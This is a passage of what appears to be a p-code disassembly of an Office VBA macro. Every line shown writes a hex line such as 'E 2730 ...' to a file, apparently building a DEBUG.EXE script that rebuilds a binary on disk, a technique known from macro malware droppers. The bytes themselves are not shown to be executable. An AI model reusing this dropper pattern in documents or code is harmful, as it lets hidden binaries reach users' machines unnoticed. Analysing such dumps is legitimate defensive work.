' 	LitStr 0x0036 "E 2730 77 5F 6C 74 63 6E 76 52 5C 63 53 56 5E 4E 4E 54"
' 	PrintItemNL 
' Line #822:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2740 10 0C 11 06 00 02 1C 16 17 17 4C 4B 09 F7 EF 09"
' 	PrintItemNL 
' Line #823:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2750 F7 EF 0F 4A 4B 51 52 56 F2 F2 F2 FE FF FD FF FF"
' 	PrintItemNL 
' Line #824:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2760 FE FC FD F9 FA FC F6 FC FE F8 F6 F7 F3 FC FD FF"
' 	PrintItemNL 
' Line #825:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2770 09 F7 EF 09 F7 EF 24 D8 DE 90 99 D2 66 AE D6 09"
' 	PrintItemNL 
' Line #826:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2780 F7 EF 09 F7 EF 09 F7 EF 1E E4 E7 8A 96 BE EA F4"
' 	PrintItemNL 
' Line #827:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2790 FF F8 FE FF F4 F7 FC D2 D4 DC C7 CB D6 C8 CB D9"
' 	PrintItemNL 
' Line #828:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 27A0 87 E4 E5 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 10"
' 	PrintItemNL 
' Line #829:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 27B0 F0 E9 09 F7 EF 09 F7 EF 09 BC B6 0C 0A 09 06 14"
' 	PrintItemNL 
' Line #830:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 27C0 16 08 E8 E1 09 F7 EF 09 F7 EF 09 F7 EF 24 BC BA"
' 	PrintItemNL 
' Line #831:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 27D0 5A 63 6C 4B 56 5E 37 43 49 2F 3B 41 26 32 38 33"
' 	PrintItemNL 
' Line #832:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 27E0 3E 42 36 40 40 26 A3 9E 09 F7 EF 09 F7 EF 28 6D"
' 	PrintItemNL 
' Line #833:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 27F0 6B 05 11 13 27 34 36 37 43 47 43 4F 53 4C 58 5C"
' 	PrintItemNL 
' Line #834:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2800 4F 5B 5F 40 4B 4F 3F 4A 4E 43 4E 52 39 42 46 39"
' 	PrintItemNL 
' Line #835:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2810 42 45 3A 3F 42 41 46 47 47 4B 4C 43 47 48 40 44"
' 	PrintItemNL 
' Line #836:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2820 45 00 02 03 00 00 F0 F3 F1 EF F2 F0 DC DE DE C9"
' 	PrintItemNL 
' Line #837:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2830 CB CB C0 C4 C5 B5 B9 BA 00 00 03 6B 70 73 67 6D"
' 	PrintItemNL 
' Line #838:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2840 72 63 69 6E 51 59 60 55 5D 64 59 62 6B 51 5A 63"
' 	PrintItemNL 
' Line #839:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2850 0D EE E7 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #840:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2860 F7 EF 09 F7 EF 4A 7F 84 66 6F 78 6F 78 81 67 6E"
' 	PrintItemNL 
' Line #841:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2870 77 66 6D 76 5E 65 6E 20 D5 D1 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #842:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2880 21 C7 C4 72 77 80 7B 7D 87 20 D5 D1 09 F7 EF 09"
' 	PrintItemNL 
' Line #843:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2890 F7 EF 4D 91 95 63 6F 75 65 71 77 5A 63 67 56 5A"
' 	PrintItemNL 
' Line #844:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 28A0 5F 48 49 4D 04 00 05 07 02 04 17 11 12 18 4F 4E"
' 	PrintItemNL 
' Line #845:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 28B0 09 F7 EF 09 F7 EF A0 DD DB F0 F4 F5 DC E1 E2 F4"
' 	PrintItemNL 
' Line #846:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 28C0 F8 F9 FD FF FF FF FF FF F1 EE EA EA E7 E3 F8 F9"
' 	PrintItemNL 
' Line #847:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 28D0 F7 F9 FC FF 09 F7 EF 09 F7 EF 28 DE E6 93 9D DD"
' 	PrintItemNL 
' Line #848:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 28E0 4E BD DB 09 F7 EF 09 F7 EF 09 F7 EF 28 DF E6 7D"
' 	PrintItemNL 
' Line #849:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 28F0 8C B3 D1 DE F4 ED F6 FF F8 FB FF FA F9 FD C0 BC"
' 	PrintItemNL 
' Line #850:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2900 C8 CA C7 D6 BA D9 E4 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #851:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2910 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 BB B6 08"
' 	PrintItemNL 
' Line #852:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2920 05 07 06 7C 79 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #853:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2930 EF 46 6B 70 54 5E 65 52 5C 63 51 5C 60 37 40 43"
' 	PrintItemNL 
' Line #854:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2940 28 31 34 33 3D 3D 35 3E 41 20 9D 9A 09 F7 EF 09"
' 	PrintItemNL 
' Line #855:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2950 F7 EF 1B 60 5E 21 2F 2E 0E 1C 1B 35 42 44 44 51"
' 	PrintItemNL 
' Line #856:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2960 53 47 54 56 46 53 55 4A 56 5A 53 5F 63 4D 59 5F"
' 	PrintItemNL 
' Line #857:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2970 3F 4B 51 3C 48 4E 3A 43 46 41 48 4B 40 45 48 3D"
' 	PrintItemNL 
' Line #858:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2980 42 45 40 45 48 00 00 03 00 00 F1 F4 F2 EE F1 EF"
' 	PrintItemNL 
' Line #859:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2990 DC DE DE CB CD CD C0 C4 C5 B3 B7 B8 00 01 04 70"
' 	PrintItemNL 
' Line #860:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 29A0 75 78 64 6A 6F 5F 65 6A 4B 53 5A 4C 54 5B 4F 58"
' 	PrintItemNL 
' Line #861:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 29B0 61 4A 53 5C 09 F7 EF 09 F7 EF 09 F7 EF 14 E7 E1"
' 	PrintItemNL 
' Line #862:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 29C0 09 F7 EF 09 F7 EF 09 F7 EF 3E 9E A0 67 70 79 68"
' 	PrintItemNL 
' Line #863:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 29D0 71 7A 63 6A 73 60 67 70 5C 61 6A 20 D5 D1 09 F7"
' 	PrintItemNL 
' Line #864:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 29E0 EF 09 F7 EF 31 AB AC 69 6E 77 75 77 81 32 BB BA"
' 	PrintItemNL 
' Line #865:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 29F0 09 F7 EF 09 F7 EF 4A 8E 91 5C 68 6E 61 6C 70 57"
' 	PrintItemNL 
' Line #866:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2A00 60 64 58 5D 60 43 44 48 01 00 02 09 06 08 1A 15"
' 	PrintItemNL 
' Line #867:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2A10 16 14 4B 4A 09 F7 EF 09 F7 EF A0 E0 DC EE F4 F3"
' 	PrintItemNL 
' Line #868:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2A20 E2 E7 E8 F4 F9 FC EA EB EF E0 DD DF E4 DF DC FA"
' 	PrintItemNL 
' Line #869:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2A30 F7 F3 FC FC FC F8 FB FF 09 F7 EF 09 F7 EF 26 DC"
' 	PrintItemNL 
' Line #870:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2A40 E7 8C 99 DD 47 C4 DE 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #871:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2A50 29 E0 E7 7E 8B B7 BE CB E5 F3 FC FF FB FE FF FF"
' 	PrintItemNL 
' Line #872:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2A60 FB FF DE D8 E3 C3 BE CD C9 C8 D8 22 F4 EE 09 F7"
' 	PrintItemNL 
' Line #873:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2A70 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #874:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2A80 0A BC B7 0A 15 19 09 E9 E1 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #875:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2A90 F7 EF 30 A9 A8 4E 56 5D 56 5E 65 50 5A 61 4E 57"
' 	PrintItemNL 
' Line #876:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2AA0 5B 35 3E 41 2D 32 33 35 3D 3D 46 4F 52 1D 9A 98"
' 	PrintItemNL 
' Line #877:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2AB0 09 F7 EF 09 F7 EF 10 64 62 24 32 31 13 21 20 25"
' 	PrintItemNL 
' Line #878:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2AC0 33 32 31 3F 3E 36 44 43 37 44 46 3D 4C 4E 4E 5A"
' 	PrintItemNL 
' Line #879:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2AD0 5E 4C 5A 60 41 4C 54 39 45 4B 3F 4A 4E 43 4C 4F"
' 	PrintItemNL 
' Line #880:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2AE0 44 4B 4E 49 4E 51 4C 51 54 01 06 09 00 00 F2 F5"
' 	PrintItemNL 
' Line #881:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2AF0 F3 ED F0 EE DD DF DF CD CF CF BF C3 C4 B1 B5 B6"
' 	PrintItemNL 
' Line #882:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2B00 00 03 06 75 7A 7D 63 69 6E 5F 65 6A 49 51 58 46"
' 	PrintItemNL 
' Line #883:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2B10 4E 55 48 51 5A 41 66 6D 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #884:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2B20 EF 60 78 7F 28 C1 BF 09 F7 EF 09 F7 EF 31 BB BB"
' 	PrintItemNL 
' Line #885:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2B30 5F 68 71 55 5E 67 5C 63 6C 5B 62 6B 58 5F 68 0E"
' 	PrintItemNL 
' Line #886:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2B40 EE E7 09 F7 EF 09 F7 EF 36 A3 A4 69 6E 77 6D 6F"
' 	PrintItemNL 
' Line #887:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2B50 79 34 AE AF 09 F7 EF 09 F7 EF 34 B0 B0 5B 67 6D"
' 	PrintItemNL 
' Line #888:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2B60 60 6B 6F 54 5D 61 4F 54 57 38 39 3D 01 1F 1F 10"
' 	PrintItemNL 
' Line #889:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2B70 1C 1D 17 12 13 12 4A 48 09 F7 EF 09 F7 EF A1 DF"
' 	PrintItemNL 
' Line #890:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2B80 DC E7 FB FA 99 F6 F4 89 F4 F2 BD DC DE DC DA DA"
' 	PrintItemNL 
' Line #891:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2B90 F0 ED E9 FF FF FE FC FD FF F6 FA FF 09 F7 EF 09"
' 	PrintItemNL 
' Line #892:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2BA0 F7 EF 27 DD E7 86 93 D7 46 C4 DF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #893:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2BB0 EF 09 F7 EF 29 DF E7 82 8F BD A0 AB CB F3 FA FF"
' 	PrintItemNL 
' Line #894:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2BC0 FA FD FF FE FD FF FA F6 FC CB C7 D2 BE BE CA 52"
' 	PrintItemNL 
' Line #895:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2BD0 E9 E8 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #896:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2BE0 EF 09 F7 EF 0A BC B7 09 7F 7D 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #897:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2BF0 09 F7 EF 09 EA E2 47 59 5D 4C 54 5B 55 5D 64 4E"
' 	PrintItemNL 
' Line #898:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2C00 58 5F 4B 54 58 34 3D 40 2D 32 33 34 3C 3C 3C 45"
' 	PrintItemNL 
' Line #899:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2C10 49 18 95 93 09 F7 EF 09 F7 EF 0D 99 95 23 2F 31"
' 	PrintItemNL 
' Line #900:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2C20 23 2F 2F 16 22 22 2A 36 36 32 3E 3E 36 42 44 3A"
' 	PrintItemNL 
' Line #901:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2C30 47 49 48 53 57 4F 5B 5F 4C 56 5D 48 52 59 40 4B"
' 	PrintItemNL 
' Line #902:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2C40 4F 3E 47 4A 3B 42 45 40 45 48 42 47 4A 00 00 03"
' 	PrintItemNL 
' Line #903:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2C50 00 00 F4 F7 F5 EC EF ED DE E0 E0 CF D1 D1 BF C3"
' 	PrintItemNL 
' Line #904:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2C60 C4 B0 B4 B5 00 04 07 77 7C 7F 63 69 6E 64 6A 6F"
' 	PrintItemNL 
' Line #905:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2C70 4E 56 5D 46 4E 55 4B 54 5D 40 82 87 09 F7 EF 09"
' 	PrintItemNL 
' Line #906:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2C80 F7 EF 21 D6 D3 61 6A 73 38 97 9A 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #907:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2C90 EF 20 D5 D1 5F 68 71 55 5E 67 5C 63 6C 5A 61 6A"
' 	PrintItemNL 
' Line #908:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2CA0 5B 62 6B 09 F7 EF 09 F7 EF 09 F7 EF 4B 8C 91 69"
' 	PrintItemNL 
' Line #909:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2CB0 70 79 63 68 71 35 A0 A2 09 F7 EF 09 F7 EF 34 B2"
' 	PrintItemNL 
' Line #910:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2CC0 B1 61 6D 73 64 6F 73 52 5B 5F 47 4C 4F 29 2A 2E"
' 	PrintItemNL 
' Line #911:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2CD0 07 BA B4 0A DB D4 0E 64 62 12 78 75 09 F7 EF 09"
' 	PrintItemNL 
' Line #912:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2CE0 F7 EF 3D F1 EA 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #913:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2CF0 EF 25 F6 EF 74 FB F5 B2 FD FA BE FB FB AF EE FB"
' 	PrintItemNL 
' Line #914:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2D00 09 F7 EF 09 F7 EF 28 DE E9 81 91 D4 47 C6 E1 09"
' 	PrintItemNL 
' Line #915:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2D10 F7 EF 09 F7 EF 09 F7 EF 29 DE E7 87 94 C8 83 8E"
' 	PrintItemNL 
' Line #916:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2D20 B4 DB E2 FB F8 FC FF FA FA FF FF FE FF E8 E6 EC"
' 	PrintItemNL 
' Line #917:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2D30 C2 C4 CC 6C D8 D9 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #918:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2D40 F7 EF 09 F7 EF 09 F7 EF 09 DA D3 09 E9 E1 09 F7"
' 	PrintItemNL 
' Line #919:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2D50 EF 09 F7 EF 09 F7 EF 05 7E 7C 42 46 4B 49 51 58"
' 	PrintItemNL 
' Line #920:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2D60 50 58 5F 4E 58 5F 4D 56 5A 2E 62 63 13 BA B4 09"
' 	PrintItemNL 
' Line #921:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2D70 F7 EF 16 AF AB 0E D2 CD 09 F7 EF 09 F7 EF 0A EB"
' 	PrintItemNL 
' Line #922:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2D80 E3 0F 46 46 29 35 35 15 21 21 1E 2A 2A 2E 3A 3A"
' 	PrintItemNL 
' Line #923:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2D90 3B 47 49 3F 4B 4D 44 4F 53 4B 56 5A 4F 57 5E 4B"
' 	PrintItemNL 
' Line #924:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2DA0 56 5A 42 4E 50 3F 48 4B 3A 41 44 3B 40 43 3E 43"
' 	PrintItemNL 
' Line #925:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2DB0 46 00 00 03 00 00 F4 F7 F5 EB EE EC DE E0 E0 D0"
' 	PrintItemNL 
' Line #926:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2DC0 D2 D2 BE C2 C3 B1 B5 B6 00 03 06 70 75 78 62 68"
' 	PrintItemNL 
' Line #927:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2DD0 6D 69 6F 74 53 5B 62 48 50 57 50 59 62 41 92 95"
' 	PrintItemNL 
' Line #928:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2DE0 09 F7 EF 09 F7 EF 3A B5 B6 5A 61 6A 3F 72 78 09"
' 	PrintItemNL 
' Line #929:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2DF0 F7 EF 09 F7 EF 0E EF E8 64 6B 74 65 6C 75 5F 68"
' 	PrintItemNL 
' Line #930:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2E00 71 57 60 69 5D 66 6F 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #931:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2E10 50 93 97 62 69 72 5F 64 6D 43 82 87 09 F7 EF 09"
' 	PrintItemNL 
' Line #932:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2E20 F7 EF 1E D5 D0 62 6E 74 62 6D 71 53 59 5E 4C 4F"
' 	PrintItemNL 
' Line #933:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2E30 53 15 51 52 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #934:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2E40 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #935:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2E50 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #936:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2E60 EF 09 F7 EF 09 F7 EF 09 F7 EF 29 E0 EA 85 95 D8"
' 	PrintItemNL 
' Line #937:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2E70 4B CB E6 09 F7 EF 09 F7 EF 09 F7 EF 29 DF E9 94"
' 	PrintItemNL 
' Line #938:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2E80 9F D9 7A 83 AF B9 C1 DF F4 F9 FF F9 FC FF FB FD"
' 	PrintItemNL 
' Line #939:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2E90 FE FD FF FF D8 DB DF 8D CB CD 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #940:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2EA0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #941:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2EB0 F7 EF 09 F7 EF 09 F7 EF 08 D9 D2 00 0F 12 3A 3E"
' 	PrintItemNL 
' Line #942:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2EC0 43 46 4F 53 4B 53 5A 4F 59 60 53 5C 60 16 CC C6"
' 	PrintItemNL 
' Line #943:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2ED0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
' 	PrintItemNL 
' Line #944:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2EE0 F7 EF 09 F7 EF 09 E9 E2 10 9B 97 1E 53 52 0B 15"
' 	PrintItemNL 
' Line #945:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2EF0 15 1D 27 27 32 3C 3C 3F 49 49 43 4C 4F 44 4D 50"
' 	PrintItemNL 
' Line #946:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2F00 43 49 4E 3A 43 47 39 45 47 3E 47 4A 3D 44 47 3D"
' 	PrintItemNL 
' Line #947:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2F10 42 45 3F 44 47 00 00 03 00 00 F4 F7 F5 EB EE EC"
' 	PrintItemNL 
' Line #948:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2F20 DE E0 E0 CF D1 D1 BE C2 C3 B3 B7 B8 00 01 04 62"
' 	PrintItemNL 
' Line #949:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2F30 67 6A 62 68 6D 6B 71 76 56 5E 65 48 50 57 50 59"
' 	PrintItemNL 
' Line #950:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2F40 62 32 AE AE 09 F7 EF 09 F7 EF 33 AE AF 57 5E 67"
' 	PrintItemNL 
' Line #951:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2F50 59 60 69 09 F7 EF 09 F7 EF 09 F7 EF 4F 73 7A 53"
' 	PrintItemNL 
' Line #952:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2F60 5A 63 5E 67 70 50 59 62 5C 65 6E 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #953:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2F70 EF 09 F7 EF 66 6F 78 5B 64 6D 59 60 69 43 84 89"
' 	PrintItemNL 
' Line #954:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2F80 09 F7 EF 09 F7 EF 1D D3 CF 5C 68 6E 5C 65 69 51"
' 	PrintItemNL 
' Line #955:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2F90 57 5C 4D 50 54 0A 90 8D 09 F7 EF 09 F7 EF 09 F7"
' 	PrintItemNL 
' Line #956:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2FA0 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF"
' 	PrintItemNL 
' Line #957:
' 	Ld hFile 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 2FB0 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09 F7 EF 09"
